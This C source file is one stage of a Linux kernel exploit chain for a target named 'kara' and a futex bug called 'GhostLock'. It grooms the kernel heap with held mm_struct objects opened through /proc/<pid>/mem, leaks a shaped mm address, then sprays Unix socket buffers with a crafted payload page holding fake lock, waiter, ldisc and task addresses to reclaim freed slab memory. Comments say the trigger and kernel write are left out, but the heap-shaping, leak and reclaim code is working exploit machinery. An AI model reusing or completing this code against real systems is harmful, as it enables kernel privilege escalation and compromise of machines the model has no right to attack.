/*
 * Standalone no-trigger mm_struct reclaim stage for kara.
 *
 * This intentionally reuses the tested leak-only implementation while
 * replacing its program entry point. Neither source contains PI-futex ops,
 * stale-waiter reuse, a kernel write, or any call into the GhostLock trigger.
 */
#define main kara_reclaim_probe_program_main
#include "kara_reclaim_probe.c"
#undef main

#include "kara_reclaim_engine.h"
#include "kara_reclaim_layout.h"

#include <sys/socket.h>

#define MM_OBJS 18u
#define MM_PARTIALS 8u
#define PREP_SLABS 32u
#define RECLAIM_PAIRS 1024u
#define MIN_RECLAIM_PAIRS 128u

struct reclaim_sockets {
    int (*pairs)[2];
    unsigned made;
};

static void init_fd_array(int *fds, unsigned count)
{
    for (unsigned i = 0; i < count; ++i)
        fds[i] = -1;
}

static void close_fd_array(int *fds, unsigned count)
{
    if (!fds)
        return;
    for (unsigned i = 0; i < count; ++i) {
        if (fds[i] >= 0) {
            close(fds[i]);
            fds[i] = -1;
        }
    }
}

static int open_child_mem_fd(pid_t child)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", child);
    return open(path, O_RDONLY | O_CLOEXEC);
}

static int allocate_held_mm(void)
{
    pid_t child = fork();
    if (child == 0) {
        for (;;)
            pause();
    }
    if (child < 0)
        return -1;

    int raw = open_child_mem_fd(child);
    int saved_errno = errno;
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    if (raw < 0) {
        errno = saved_errno;
        return -1;
    }
    int held = fcntl(raw, F_DUPFD_CLOEXEC, 512);
    saved_errno = errno;
    close(raw);
    errno = saved_errno;
    return held;
}

static int allocate_mm_array(int *fds, unsigned count, const char *label)
{
    for (unsigned i = 0; i < count; ++i) {
        fds[i] = allocate_held_mm();
        if (fds[i] < 0) {
            fprintf(stderr, "[-] %s mm allocation %u/%u failed errno=%d\n",
                    label, i, count, errno);
            return 0;
        }
    }
    return 1;
}

static void close_reclaim_sockets(struct reclaim_sockets *sockets)
{
    if (!sockets || !sockets->pairs)
        return;
    for (unsigned i = 0; i < sockets->made; ++i) {
        if (sockets->pairs[i][0] >= 0)
            close(sockets->pairs[i][0]);
        if (sockets->pairs[i][1] >= 0)
            close(sockets->pairs[i][1]);
        sockets->pairs[i][0] = sockets->pairs[i][1] = -1;
    }
    free(sockets->pairs);
    sockets->pairs = NULL;
    sockets->made = 0;
}

static int prepare_reclaim_sockets(struct reclaim_sockets *sockets)
{
    sockets->pairs = calloc(RECLAIM_PAIRS, sizeof(*sockets->pairs));
    if (!sockets->pairs)
        return 0;
    for (unsigned i = 0; i < RECLAIM_PAIRS; ++i)
        sockets->pairs[i][0] = sockets->pairs[i][1] = -1;

    for (; sockets->made < RECLAIM_PAIRS; ++sockets->made) {
        int *pair = sockets->pairs[sockets->made];
        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, pair))
            break;
        int sndbuf = 1 << 20;
        if (setsockopt(pair[0], SOL_SOCKET, SO_SNDBUF,
                       &sndbuf, sizeof(sndbuf))) {
            close(pair[0]);
            close(pair[1]);
            pair[0] = pair[1] = -1;
            break;
        }
    }
    if (sockets->made < MIN_RECLAIM_PAIRS) {
        fprintf(stderr, "[-] only %u reclaim socket pairs available\n",
                sockets->made);
        return 0;
    }
    return 1;
}

static unsigned launch_reclaim_sends(struct reclaim_sockets *sockets,
                                     const uint8_t *payload)
{
    unsigned sent = 0;
    for (; sent < sockets->made; ++sent) {
        ssize_t result = send(sockets->pairs[sent][0], payload,
                              KARA_MM_SLAB_SIZE,
                              MSG_DONTWAIT | MSG_NOSIGNAL);
        if (result != KARA_MM_SLAB_SIZE)
            break;
    }
    return sent;
}

static int verify_queued_payload(const struct reclaim_sockets *sockets,
                                 const uint8_t *payload, unsigned sent)
{
    uint8_t *peek = malloc(KARA_MM_SLAB_SIZE);
    if (!peek)
        return 0;
    unsigned checked = sent < 16u ? sent : 16u;
    for (unsigned i = 0; i < checked; ++i) {
        unsigned index = (unsigned)(((uint64_t)i * sent) / checked);
        ssize_t got = recv(sockets->pairs[index][1], peek,
                           KARA_MM_SLAB_SIZE,
                           MSG_PEEK | MSG_DONTWAIT);
        if (got != KARA_MM_SLAB_SIZE ||
            memcmp(peek, payload, KARA_MM_SLAB_SIZE)) {
            free(peek);
            return 0;
        }
    }
    free(peek);
    return checked != 0;
}

static int setup_probe_maps(void)
{
    g_shared = mmap(NULL, KARA_PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    g_arena_size = ((size_t)g_cfg.scan_pages + 1u) * KARA_PAGE_SIZE;
    g_arena = mmap(NULL, g_arena_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (g_shared == MAP_FAILED || g_arena == MAP_FAILED)
        return 0;
    memset(g_shared, 0, KARA_PAGE_SIZE);
    return 1;
}

static int leak_shaped_mm(int *leak_fd_out, uint32_t *mm_out,
                          unsigned *score_out, unsigned *ties_out, int *post,
                          unsigned post_count)
{
    pid_t child = fork();
    if (child == 0)
        collision_child();
    if (child < 0)
        return 0;

    uint64_t deadline = now_ns() +
                        (uint64_t)g_cfg.timeout_sec * 1000000000ull;
    while (!g_shared->started && now_ns() < deadline)
        sched_yield();
    if (!g_shared->started) {
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
        return 0;
    }

    int raw = open_child_mem_fd(child);
    if (raw < 0) {
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
        return 0;
    }
    int held = fcntl(raw, F_DUPFD_CLOEXEC, 512);
    close(raw);
    if (held < 0) {
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
        return 0;
    }

    *leak_fd_out = held;
    if (!allocate_mm_array(post, post_count, "post")) {
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
        return 0;
    }
    if (!wait_for_child(child))
        return 0;
    *mm_out = solve_mm(score_out, ties_out);
    return *mm_out != 0;
}

static int allocator_valid_mm(uint32_t mm)
{
    uint32_t base = mm & ~(KARA_MM_SLAB_SIZE - 1u);
    uint32_t delta = mm - base;
    return delta % MM_OBJECT_SIZE == 0u &&
           delta / MM_OBJECT_SIZE < MM_OBJS;
}

int kara_reclaim_prepare(struct kara_reclaim_hold *hold)
{
    const unsigned prep_count = PREP_SLABS * MM_OBJS;
    const unsigned spray_count = (1u + MM_PARTIALS) * MM_OBJS;
    const unsigned pre_count = MM_OBJS - 1u;
    const unsigned post_count = MM_OBJS;

    if (!hold)
        return 0;
    memset(hold, 0, sizeof(*hold));

    int *prep = calloc(prep_count, sizeof(*prep));
    int *spray = calloc(spray_count, sizeof(*spray));
    int *pre = calloc(pre_count, sizeof(*pre));
    int *post = calloc(post_count, sizeof(*post));
    int leak_fd = -1;
    uint8_t *payload = NULL;
    struct reclaim_sockets sockets = {0};
    struct kara_reclaim_addresses addresses;
    uint32_t leaked_mm = 0;
    unsigned score = 0;
    unsigned ties = 0;
    int ok = 0;

    fprintf(stderr,
            "[mode] reclaim-only; NO PI futex, stale waiter, kernel write, "
            "or trigger\n");
    if (prep)
        init_fd_array(prep, prep_count);
    if (spray)
        init_fd_array(spray, spray_count);
    if (pre)
        init_fd_array(pre, pre_count);
    if (post)
        init_fd_array(post, post_count);
    if (!prep || !spray || !pre || !post)
        goto cleanup;
    if (!setup_probe_maps()) {
        perror("probe mmap");
        goto cleanup;
    }
    (void)pin_to_cpu0();

    fprintf(stderr, "[shape] allocating held mm objects: %u + %u + %u\n",
            prep_count, spray_count, pre_count);
    if (!allocate_mm_array(prep, prep_count, "prep") ||
        !allocate_mm_array(spray, spray_count, "spray") ||
        !allocate_mm_array(pre, pre_count, "pre"))
        goto cleanup;

    if (!leak_shaped_mm(&leak_fd, &leaked_mm, &score, &ties,
                        post, post_count)) {
        fprintf(stderr, "[-] shaped mm leak failed\n");
        goto cleanup;
    }
    if (!allocator_valid_mm(leaked_mm)) {
        fprintf(stderr, "[-] leaked mm %08x is off the 0x1c0/18-object grid\n",
                leaked_mm);
        goto cleanup;
    }
    if (!kara_reclaim_score_confident(score, g_shared->candidate_count)) {
        fprintf(stderr,
                "[-] refusing weak mm solution: mm=%08x score=%u/%u, "
                "require >=%u/%u\n",
                leaked_mm, score, g_shared->candidate_count,
                KARA_RECLAIM_MIN_CONFIDENT_SCORE,
                KARA_RECLAIM_EXPECTED_CANDIDATES);
        goto cleanup;
    }

    uint32_t page_base = leaked_mm & ~(KARA_MM_SLAB_SIZE - 1u);
    if (posix_memalign((void **)&payload, KARA_MM_SLAB_SIZE,
                       KARA_MM_SLAB_SIZE))
        goto cleanup;
    kara_fill_reclaim_page(payload, page_base, &addresses);
    if (!prepare_reclaim_sockets(&sockets))
        goto cleanup;

    fprintf(stderr,
            "[leak] mm=%08x page=%08x slot=%u score=%u/%u ties=%u\n"
            "[anchor] lock=%08x waiter=%08x ldisc=%08x task=%08x\n"
            "[reclaim] prepared %u sockets; freeing shaped slabs now\n",
            leaked_mm, page_base,
            (leaked_mm - page_base) / MM_OBJECT_SIZE,
            score, g_shared->candidate_count, ties,
            addresses.fake_lock, addresses.fake_waiter,
            addresses.fake_ldisc, addresses.fake_task,
            sockets.made);
    fflush(stderr);

    /* No allocations or diagnostic syscalls between the drain and sends. */
    close_fd_array(pre, pre_count);
    close(leak_fd);
    leak_fd = -1;
    close_fd_array(post, post_count);
    close_fd_array(spray, spray_count);
    close_fd_array(prep, prep_count);
    unsigned sent = launch_reclaim_sends(&sockets, payload);

    fprintf(stderr, "[reclaim] queued %u/%u order-1 payloads\n",
            sent, sockets.made);
    if (sent < MIN_RECLAIM_PAIRS ||
        !verify_queued_payload(&sockets, payload, sent)) {
        fprintf(stderr, "[-] socket payload verification failed\n");
        goto cleanup;
    }
    hold->socket_pairs = sockets.pairs;
    hold->socket_count = sockets.made;
    hold->sent_count = sent;
    hold->payload = payload;
    hold->leaked_mm = leaked_mm;
    hold->page_base = page_base;
    hold->collision_score = score;
    hold->candidate_count = g_shared->candidate_count;
    hold->addresses = addresses;
    sockets.pairs = NULL;
    sockets.made = 0;
    payload = NULL;
    ok = 1;

cleanup:
    if (leak_fd >= 0)
        close(leak_fd);
    close_fd_array(post, post_count);
    close_fd_array(pre, pre_count);
    close_fd_array(spray, spray_count);
    close_fd_array(prep, prep_count);
    close_reclaim_sockets(&sockets);
    free(payload);
    free(post);
    free(pre);
    free(spray);
    free(prep);
    if (g_arena && g_arena != MAP_FAILED) {
        munmap(g_arena, g_arena_size);
        g_arena = NULL;
    }
    if (g_shared && g_shared != MAP_FAILED) {
        munmap(g_shared, KARA_PAGE_SIZE);
        g_shared = NULL;
    }
    return ok;
}

void kara_reclaim_release(struct kara_reclaim_hold *hold)
{
    if (!hold)
        return;
    struct reclaim_sockets sockets = {
        .pairs = hold->socket_pairs,
        .made = hold->socket_count,
    };
    close_reclaim_sockets(&sockets);
    free(hold->payload);
    memset(hold, 0, sizeof(*hold));
}

#ifndef KARA_RECLAIM_LIBRARY_ONLY
int main(void)
{
    struct kara_reclaim_hold hold;
    if (!kara_reclaim_prepare(&hold))
        return 2;
    puts("RESULT reclaim-only PASS (capture probabilistic); NO_TRIGGER");
    kara_reclaim_release(&hold);
    return 0;
}
#endif
